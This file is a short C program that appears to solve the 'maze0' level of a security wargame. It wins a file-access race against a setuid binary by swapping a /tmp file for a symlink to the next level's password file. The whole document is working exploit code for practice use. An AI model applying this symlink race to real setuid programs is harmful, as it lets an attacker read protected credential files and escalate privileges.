#include <sys/resource.h>
#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include <spawn.h>
#include <stdlib.h>
#include <time.h>
int main(int argc,char ** argv, char **envp){
    pid_t pid; 
    char fname[] = "/tmp/128ecf542a35ac5270a87dc740918404";
    FILE * fp;
    struct timespec tim,tim2;
    char * z_argv[] = {"/maze/maze0"};
    tim.tv_sec = 0;
    tim.tv_nsec = 13000;
    //Remove If file exists
    remove(fname);
    //Create file
    fp = fopen(fname,"a+");
    fprintf(fp,"Test\n");
    fclose(fp);
    
    posix_spawn(&pid,"/maze/maze0",NULL,NULL,z_argv,envp);
    nanosleep(&tim,&tim2);
    remove(fname);
    symlink("/etc/maze_pass/maze1",fname);
}
